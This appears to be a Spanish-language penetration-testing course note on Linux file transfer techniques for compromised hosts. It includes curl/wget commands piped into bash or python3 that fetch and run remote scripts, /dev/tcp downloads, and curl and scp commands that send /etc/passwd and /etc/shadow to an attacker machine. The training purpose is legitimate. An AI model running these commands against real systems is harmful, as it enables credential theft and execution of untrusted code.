# Linux File Transfer Methods

Linux es un sistema operativo versátil que proporciona múltiples herramientas para transferir archivos. Comprender los métodos de transferencia de archivos en Linux puede ayudar a los atacantes y defensores a mejorar sus habilidades para atacar redes o prevenir ataques sofisticados.

En una intervención de respuesta ante incidentes realizada hace algunos años, encontramos múltiples actores maliciosos en seis de los nueve servidores web investigados. El atacante aprovechó una vulnerabilidad de inyección SQL y utilizó un script de Bash que, al ejecutarse, intentaba descargar otro malware para conectar al servidor con el C2 (command and control).

El script Bash intentaba tres métodos para descargar malware: primero `cURL`, luego `wget` y, si fallaban, usaba Python. Todos estos métodos utilizaban HTTP para la comunicación.

Aunque Linux puede comunicarse mediante FTP o SMB como Windows, la mayoría del malware usa HTTP y HTTPS. En esta sección, revisaremos varios métodos para transferir archivos en Linux, como HTTP, Bash y SSH.

## **Operaciones de Descarga**

Tenemos acceso a la máquina **NIX04** y necesitamos descargar un archivo desde nuestra máquina **Pwnbox**. Veremos cómo podemos lograr esto utilizando varios métodos de descarga de archivos.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Codificación y Decodificación Base64

Dependiendo del tamaño del archivo, podemos usar un método que no requiera comunicación en red. Si tenemos acceso a una terminal, podemos codificar un archivo en una cadena Base64, copiar su contenido al terminal y realizar la operación inversa. Veamos cómo hacerlo usando Bash.

### **Pwnbox - Comprobar el hash MD5 del archivo**

```bash
sherlock28@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Usamos `cat` para imprimir el contenido del archivo y codificarlo en Base64 usando una tubería `|`. Usamos la opción `-w 0` para crear una sola línea, y terminamos el comando con un punto y coma `;` y la palabra clave `echo` para empezar una nueva línea, facilitando la copia.

### **Pwnbox - Codificar la clave SSH en Base64**

```bash
sherlock28@htb[/htb]$ cat id_rsa | base64 -w 0; echo
```

El contenido codificado sería algo como esto (truncado por simplicidad):

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB...
```

Copiamos este contenido, lo pegamos en la máquina **Linux** de destino y usamos `base64` con la opción `-d` para decodificarlo.

### **Linux - Decodificar el archivo**

```bash
sherlock28@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbG...' | base64 -d > id_rsa
```

Finalmente, podemos confirmar si el archivo fue transferido correctamente usando el comando `md5sum`.

### **Linux - Confirmar que los hashes MD5 coinciden**

```bash
sherlock28@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

> **Nota:** También puedes subir archivos usando la operación inversa. Desde tu máquina comprometida, usa `cat` para codificar un archivo en Base64 y decodifícalo en tu **Pwnbox**.

## Descargas Web con Wget y cURL

Dos de las herramientas más comunes en las distribuciones de Linux para interactuar con aplicaciones web son `wget` y `curl`. Estas herramientas están instaladas en muchas distribuciones de Linux.

Para descargar un archivo usando `wget`, necesitamos especificar la URL y la opción `-O` para establecer el nombre del archivo de salida.

### **Descargar un archivo usando Wget**

```bash
sherlock28@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` es muy similar a `wget`, pero la opción para el nombre del archivo de salida es en minúsculas `-o`.

### **Descargar un archivo usando cURL**

```bash
sherlock28@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Ataques Fileless en Linux

Debido a la forma en que funciona Linux y cómo operan las tuberías (`pipes`), la mayoría de las herramientas que usamos en Linux pueden replicar operaciones sin archivos, lo que significa que no tenemos que descargar un archivo para ejecutarlo.

> **Nota:** Algunos payloads, como `mkfifo`, escriben archivos en el disco. Aunque la ejecución del payload puede ser "sin archivos" cuando usas una tubería, dependiendo del payload elegido, puede que se creen archivos temporales en el sistema operativo.

Tomemos el comando `cURL` que usamos anteriormente y, en lugar de descargar el script `LinEnum.sh`, ejecutémoslo directamente usando una tubería.

### **Descarga Fileless con cURL**

```bash
bashCopiar códigosherlock28@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

De manera similar, podemos descargar un archivo de script Python desde un servidor web y canalizarlo al intérprete de Python. Hagamos esto usando `wget`.

### **Descarga Fileless con Wget**

```bash
bashCopiar códigosherlock28@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Descarga con Bash (/dev/tcp)

En ciertas situaciones, puede que no tengamos acceso a herramientas conocidas de transferencia de archivos. Mientras tengamos Bash versión 2.04 o superior instalado (compilado con `--enable-net-redirections`), podemos usar el archivo de dispositivo `/dev/tcp` para realizar descargas simples.

### **Conectar al servidor web objetivo**

```bash
sherlock28@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

### **Realizar una solicitud HTTP GET**

```bash
sherlock28@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### **Imprimir la respuesta**

```bash
sherlock28@htb[/htb]$ cat <&3
```

## Descargas SSH

SSH (o Secure Shell) es un protocolo que permite el acceso seguro a computadoras remotas. SSH viene con la utilidad SCP para transferencias de archivos remotas, que, por defecto, usa el protocolo SSH.

`SCP` (secure copy) es una utilidad de línea de comandos que permite copiar archivos y directorios entre dos hosts de manera segura. Podemos copiar archivos desde nuestra máquina local a servidores remotos y viceversa.

SCP es muy similar al comando `cp` (copy), pero en lugar de proporcionar una ruta local, necesitamos especificar un nombre de usuario, la dirección IP o nombre DNS del host remoto, y las credenciales del usuario.

Antes de comenzar a descargar archivos desde nuestro objetivo Linux hacia nuestro Pwnbox, vamos a configurar un servidor SSH en nuestro Pwnbox.

**Habilitar el servidor SSH**

```bash
sherlock28@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

### **Iniciar el servidor SSH**

```bash
sherlock28@htb[/htb]$ sudo systemctl start ssh
```

### **Verificar el puerto de escucha de SSH**

```bash
sherlock28@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Ahora podemos comenzar a transferir archivos. Necesitamos especificar la dirección IP de nuestro Pwnbox, el nombre de usuario y la contraseña.

### **Descargar archivos usando SCP**

```bash
sherlock28@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

> **Nota:** Puedes crear una cuenta de usuario temporal para transferencias de archivos y evitar usar tus credenciales o claves principales en una computadora remota.

## Operaciones de Subida

En situaciones como la explotación binaria o el análisis de capturas de paquetes, necesitamos subir archivos desde nuestra máquina objetivo hacia nuestro host atacante. Los métodos que usamos para descargas también funcionarán para subidas. Veamos cómo podemos subir archivos de varias maneras.

## Subida Web

Como mencionamos en la sección de métodos de transferencia de archivos de Windows, podemos usar `uploadserver`, un módulo extendido del módulo `HTTP.Server` de Python, que incluye una página de subida de archivos. Para este ejemplo en Linux, veamos cómo configurar el módulo `uploadserver` para usar HTTPS y asegurar la comunicación.

Lo primero que necesitamos hacer es instalar el módulo `uploadserver`.

### **Pwnbox - Iniciar el servidor web**

```bash
sherlock28@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Ahora necesitamos crear un certificado. En este ejemplo, usamos un certificado autofirmado.

### **Pwnbox - Crear un certificado autofirmado**

```bash
sherlock28@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

El servidor web no debería alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo de nuestro servidor web.

### **Pwnbox - Iniciar el servidor web**

```bash
sherlock28@htb[/htb]$ mkdir https && cd https
  
sherlock28@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Ahora, desde nuestra máquina comprometida, subamos los archivos `/etc/passwd` y `/etc/shadow`.

### **Linux - Subir múltiples archivos**

```bash
sherlock28@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opción `--insecure` porque usamos un certificado autofirmado en el que confiamos.

## Método Alternativo de Transferencia de Archivos Web

Dado que las distribuciones de Linux suelen tener Python o PHP instalados, iniciar un servidor web para transferir archivos es algo sencillo. Además, si el servidor que comprometimos es un servidor web, podemos mover los archivos que queremos transferir al directorio del servidor web y acceder a ellos desde la página web, lo que significa que estamos descargando el archivo desde nuestro Pwnbox.

Es posible levantar un servidor web utilizando varios lenguajes. Una máquina Linux comprometida puede no tener un servidor web instalado. En tales casos, podemos usar un mini servidor web. Aunque estos servidores no son muy seguros, son flexibles, ya que la ubicación del webroot y los puertos de escucha se pueden cambiar rápidamente.

### **Linux - Crear un Servidor Web con Python3**

```bash
sherlock28@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### **Linux - Crear un Servidor Web con Python2.7**

```bash
sherlock28@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### **Linux - Crear un Servidor Web con PHP**

```bash
sherlock28@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

### **Linux - Crear un Servidor Web con Ruby**

```bash
sherlock28@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

### **Descargar el Archivo desde la Máquina Objetivo hacia el Pwnbox**

```bash
sherlock28@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

> **Nota:** Cuando iniciamos un nuevo servidor web usando Python o PHP, es importante considerar que el tráfico entrante podría estar bloqueado. Estamos transfiriendo un archivo desde nuestra máquina objetivo hacia nuestro host de ataque, pero no estamos subiendo el archivo.

***

## Subida de Archivos con SCP

Es posible encontrar empresas que permiten conexiones salientes con el protocolo SSH (TCP/22), y si es el caso, podemos usar un servidor SSH con la utilidad `scp` para subir archivos. Vamos a intentar subir un archivo a la máquina objetivo usando el protocolo SSH.

### **Subida de Archivo Usando SCP**

```bash
sherlock28@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                                                                           100% 3414     6.7MB/s   00:00
```

> **Nota:** Recuerda que la sintaxis de `scp` es similar a la de `cp` o `copy`.

## Adelante

Estos son los métodos más comunes de transferencia de archivos utilizando herramientas integradas en sistemas Linux, pero hay más. En las siguientes secciones, discutiremos otros mecanismos y herramientas que podemos usar para realizar operaciones de transferencia de archivos.
